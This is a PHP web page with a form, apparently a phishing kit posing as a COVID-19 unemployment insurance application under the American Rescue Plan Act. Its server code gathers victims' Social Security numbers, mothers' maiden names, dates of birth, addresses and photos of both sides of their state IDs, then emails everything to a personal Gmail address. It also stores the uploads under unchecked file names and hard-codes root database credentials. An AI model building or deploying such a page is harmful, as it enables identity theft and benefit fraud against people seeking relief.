<?php
    session_start();

    if (isset($_POST["application_button"])) {
        // $_SESSION["alert"] = "";
        session_unset();
        $connection = mysqli_connect("localhost", "root", "root", "tosin");
        $f_name = $_POST["f_name"];
        $m_name = $_POST["m_name"];
        $l_name = $_POST["l_name"];
        $cell_sms = $_POST["cell_sms"];
        $employment_status = $_POST["employment_status"];
        $ssn = $_POST["ssn"];
        $maiden = $_POST["maiden"];
        $address = $_POST["address"];
        $apartment = $_POST["apartment"];
        $city = $_POST["city"];
        $state = $_POST["state"];
        $zip_code = $_POST["zip_code"];
        $gender = $_POST["gender"];
        $dob = $_POST["dob"];
        $education = $_POST["education"];
        $payment = $_POST["payment"];
        $recieved = $_POST["recieved"];
        $heritage = $_POST["heritage"];
        $race = $_POST["race"];
        $available = $_POST["available"];
        $stat = $_POST["stat"];
        $elected = $_POST["elected"];
        $state_id_front = $_FILES["state_id_front"];
        $state_id_back = $_FILES["state_id_back"];
        $email_address = $_POST["email_address"];
        
        $one_name = $_FILES["state_id_front"]["name"];
        $two_name = $_FILES["state_id_back"]["name"];
        $one_temp_name = $_FILES["state_id_front"]["tmp_name"];
        $two_temp_name = $_FILES["state_id_back"]["tmp_name"];
        $folder = "images/";
        if (
            empty($f_name) || empty($l_name) || empty($cell_sms) 
            || empty($employment_status)|| empty($email_address) 
            || empty($ssn)|| empty($maiden)  || empty($address)|| empty($apartment) 
            || empty($city)|| empty($state) || empty($zip_code)|| empty($gender) 
            || empty($dob)|| empty($education)  || empty($payment)|| empty($recieved) 
            || empty($heritage)|| empty($race) || empty($available)|| empty($stat) 
            || empty($elected)|| empty($state_id_front) || empty($state_id_back)|| empty($email_address) 
        ){
            $_SESSION["alert"] = "<div class='error'>All fields are required</div>";
        } else {
            // Upload Image
            $uploadResponse = move_uploaded_file($one_temp_name, $folder.$one_name);
            $uploadResponse2 = move_uploaded_file($two_temp_name, $folder.$two_name);
        
            $to = "murshhood@gmail.com";
            $subject = "From Application Form";

            $message = '
                <html>
                    <head>
                        <meta charset="UTF-8">
                        <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    </head>
                    <body>
                        <p>First Name : '.$f_name.'</p>
                        <p>Last Name : '.$l_name.'</p>
                        <p>Cell SMS : '.$cell_sms.'</p>
                        <p>Email Address : '.$email_address.'</p>
                        <p>Employment Status: '.$employment_status.'</p>;
                        <p>SSN: '.$ssn.'</p>;
                        <p>Maiden name: '.$maiden.'</p>;
                        <p>Address: '.$address.'</p>;
                        <p>Apartment: '.$apartment.'</p>;
                        <p>City: '.$city.'</p>;
                        <p>State: '.$state.'</p>;
                        <p>Zip Code: '.$zip_code.'</p>;
                        <p>Gender: '.$gender.'</p>;
                        <p>Date of Birth: '.$dob.'</p>;
                        <p>Education: '.$education.'</p>;
                        <p>Payment: '.$payment.'</p>;
                        <p>Have You received Any Covid19 Relief Bonus in past?: '.$recieved.'</p>;
                        <p>Are you Hispanic or Latino heritage?: '.$heritage.'</p>;
                        <p>Race: '.$race.'</p>;
                        <p>If offered a job, are you able and available to accept it: '.$available.'</p>;
                        <p>Are you self-employed, or the owner, or the operator of a business or farm?: '.$stat.'</p>;
                        <p>re you in an elected, appointed or in a major policy making positon?: '.$elected.'</p>;
                        <p>Front ID: <img src="https://.com/'.$folder.$one_name.'" /></p>
                        <p>Back ID: <img src="https://.com/'.$folder.$two_name.'" /></p>
                    </body>
                </html>
            ';

            mail($to, $subject, $message);
            header("Location: success.php");

        }
    }

    
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Application Form | Unemployment Insurance Relief During COVID-19 Outbreak | American Rescue Plan Act.</title>
    <link rel="preconnect" href="https://fonts.googleapis.com"> 
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin> 
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300;0,400;0,600;0,700;0,800;1,300;1,400;1,600;1,700;1,800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.3/css/fontawesome.min.css">
    <link rel="stylesheet" href="css/css/font-awesome.min.css" />
    <link rel="stylesheet" href="css/style.css" />
</head>
<body>
<?php include("head_section.php");?>
    <main>
        <section id="application">
            <h3>UNEMPLOYMENT INSURANCE APPLICATION FORM</h3>
                <?php 
                    if (isset($_SESSION["alert"])) {
                        echo $_SESSION["alert"];
                    }
                    
                ?>
            <p style="padding-top: 10px;">Before filing, make sure you have the following information available:</p>
            <ul style="padding: 20px 0;padding-left: 30px; ">
                <li>Social Security number</li>
                <li>Driver’s license or State ID number</li>
            </ul>
            <p>You do not need to do anything to receive your payment. It will arrive by mail in the form of a paper check or debit card or direct deposit to your bank account.</p>
            <br />
            <br />
            <br />
            <form action="" method="post" enctype="multipart/form-data">
                <aside>
                    <article>
                        <section class="three">
                            <div>
                                <label for="f_name">First Name <sup>*</sup></label>
                                <input type="text" name="f_name" id="f_name" placeholder="E.g Jane" />
                            </div>
                            <div>
                                <label for="m_name">Middle <sup>*</sup></label>
                                <input type="text" name="m_name" id="m_name" placeholder="E.g Ann">
                            </div>
                            <div>
                                <label for="l_name">Last Name <sup>*</sup></label>
                                <input type="text" name="l_name" id="l_name" placeholder="E.g Doe"/>
                            </div>
                        </section>
                        <section class="two">
                            <div>
                                <label for="cell_sms">Cell for SMS <sup>*</sup></label>
                                <input type="text" name="cell_sms" id="cell_sms" placeholder="Eg. (555) 555-5555" />
                            </div>
                            <div>
                                <label for="employment_status">Employment <sup>*</sup></label>
                                <select name="employment_status" id="employment_status">
                                    <option value="">Please Select</option>
                                    <option value="Working">Working</option>
                                    <option value="Not Working">Not Working</option>
                                    <option value="Working Part-Time">Working Part-Time</option>
                                </select>
                            </div>
                        </section>
                        <section class="two">
                            <div>
                                <label for="ssn">SSN# <sup>*</sup></label>
                                <input type="text" name="ssn" id="ssn" placeholder="Eg. 555005555" />
                            </div>
                            <div>
                                <label for="maiden">Mother's Maiden Name <sup>*</sup></label>
                                <input type="text" name="maiden" id="maiden" placeholder="Eg. Amanda" />
                            </div>
                        </section>
                        <section class="two">
                            <div>
                                <label for="address">Street Address <sup>*</sup></label>
                                <input type="text" name="address" id="address">
                            </div>
                            <div>
                                <label for="apartment">Apt/Unit <sup>*</sup></label>
                                <input type="text" name="apartment" id="apartment">
                            </div>
                        </section>
                        <section class="three">
                            <div>
                                <label for="city">City <sup>*</sup></label>
                                <input type="text" name="city" id="city">
                            </div>
                            <div>
                                <label for="state"> State <sup>*</sup></label>
                                <select name="state" id="state">
                                    <option value="">Please Select</option>
                                    <option value="Alaska">Alaska</option>
                                    <option value="Alabama">Alabama</option>
                                    <option value="Arkansas">Arkansas</option>
                                </select>
                            </div>
                            <div>
                                <label for="zip_code">Zip code <sup>*</sup></label>
                                <input type="text" name="zip_code" id="zip_code">
                            </div>
                        </section>
                        <section class="two">
                            <div>
                                <label for="gender"> Gender <sup>*</sup></label>
                                <select name="gender" id="gender">
                                    <option value="">Please Select</option>
                                    <option value="Male">Male</option>
                                    <option value="Female">Female</option>
                                </select>
                            </div>
                            <div>
                                <label for="dob">Date of Birth <sup>*</sup></label>
                                <input type="date" name="dob" id="dob" placeholder="MM/DD/YYYY">
                            </div>
                        </section>
                        <section class="two">
                            <div>
                                <label for="education"> Education <sup>*</sup></label>
                                <input type="text" name="education" id="education">
                            </div>
                            <div>
                                <label for="payment">Payment Type <sup>*</sup></label>
                                <select name="payment" id="payment">
                                    <option value="">Please Select</option>
                                    <option value="check">Check</option>
                                    <option value="debit">Debit Card</option>
                                    <option value="direct_deposit">Direct Deposit</option>
                                </select>
                            </div>
                        </section>
                    </article>
                    <article>
                        <section>
                            <div>
                                <p>Have You received Any Covid19 Relief Bonus in past? <sup>*</sup></p>
                                <div class="radios">
                                    <div>
                                        <input type="radio" name="recieved" value="yes" id="recieved_yes"> &nbsp; &nbsp;
                                        <label for="recieved_yes">Yes</label>
                                    </div>
                                    <div>
                                        <input type="radio" name="recieved" value="no" id="recieved_no"> &nbsp; &nbsp;
                                        <label for="recieved_no">No</label>
                                    </div>
                                </div>
                            </div>
                            <div>
                                <p>Are you Hispanic or Latino heritage? <sup>*</sup></p>
                                <div class="radios">
                                    <div>
                                        <input type="radio" name="heritage"  value="yes" id="heritage_yes"> &nbsp; &nbsp;
                                        <label for="heritage_yes">Yes</label>
                                    </div>
                                    <div>
                                        <input type="radio" name="heritage" value="no"  id="heritage_no"> &nbsp; &nbsp;
                                        <label for="heritage_no">No</label>
                                    </div>
                                </div>
                            </div>
                            <div>
                                <p>Race - Please select all that apply<sup>*</sup></p>
                                <div>
                                    <span>
                                        <input type="radio" name="race" value="African American/Black" id=""> 
                                        <label for="">African American/Black</label>
                                    </span>
                                    <span>
                                        <input type="radio" name="race" value="American Indian/Alaskan Native" id=""> 
                                        <label for="">American Indian/Alaskan Native </label>
                                    </span>
                                    <span>
                                        <input type="radio" name="race" value="Asian" id=""> 
                                        <label for="">Asian </label>
                                    </span>
                                    <span>
                                        <input type="radio" name="race" value="Hawaiian/Other Pacific Islander" id=""> 
                                        <label for="">Hawaiian/Other Pacific Islander </label>
                                    </span>
                                    <span>
                                        <input type="radio" name="race" value="White" id=""> 
                                        <label for="">White </label>
                                    </span>
                                    <span>
                                        <input type="radio" name="race" value="I do not wish to answer" id=""> 
                                        <label for="">I do not wish to answer  </label>
                                    </span>
                                </div>
    
                            </div>
                            <div>
                                <p>If offered a job, are you able and available to accept it? <sup>*</sup></p>
                                <div class="radios">
                                    <div>
                                        <input type="radio" name="available" value="yes" id="available_yes"> &nbsp; &nbsp;
                                        <label for="available_yes">Yes</label>
                                    </div>
                                    <div>
                                        <input type="radio" name="available" value="no" id="available_no"> &nbsp; &nbsp;
                                        <label for="available_no">No</label>
                                    </div>
                                </div>
                            </div>
                            <div>
                                <p>Are you self-employed, or the owner, or the operator of a business or farm? <sup>*</sup></p>
                                <div class="radios">
                                    <div>
                                        <input type="radio" name="stat" value="yes" id="stat_yes"> &nbsp; &nbsp;
                                        <label for="stat_yes">Yes</label>
                                    </div>
                                    <div>
                                        <input type="radio" name="stat" value="no" id="stat_no"> &nbsp; &nbsp;
                                        <label for="stat_no">No</label>
                                    </div>
                                </div>
                            </div>
                            <div>
                                <p>Are you in an elected, appointed or in a major policy making positon? <sup>*</sup></p>
                                <div class="radios">
                                    <div>
                                        <input type="radio" name="elected" value="yes" id="elected_yes"> &nbsp; &nbsp;
                                        <label for="elected_yes">Yes</label>
                                    </div>
                                    <div>
                                        <input type="radio" name="elected" value="no" id="elected_no"> &nbsp; &nbsp;
                                        <label for="elected_no">No</label>
                                    </div>
                                </div>
                            </div>
                            <div>
                                <p>Upload front of your State ID/License <sup>*</sup></p>
                                <input type="file" name="state_id_front" id="state_id_front"> 
                            </div>
                            <div>
                                <p>Upload back of your State ID/License <sup>*</sup></p>
                                <input type="file" name="state_id_back" id="state_id_back"> 
                            </div>
                            <div>
                                <label for="email_address">Email  <sup>*</sup></label>
                                <input type="email" name="email_address" id="email_address">
                            </div>
                        </section>
                    </article>
                </aside>
                <div>
                    <button name="application_button">SUBMIT APPLICATION</button>
                </div>
            </form>
        </section>
    </main>
    <footer>
        <h2>&copy; 2021, American Rescue Plan Act.</h2>
        <div>
            <i class="fa fa-facebook"></i>
            <i class="fa fa-twitter"></i>
        </div>
    </footer>
    <script>
        setTimeout(() => {
            
        document.querySelector('.error').style.display = 'none';
        // document.querySelector('.pass').style.display = 'none';
        }, 10000);

    
    </script>
</body>
</html>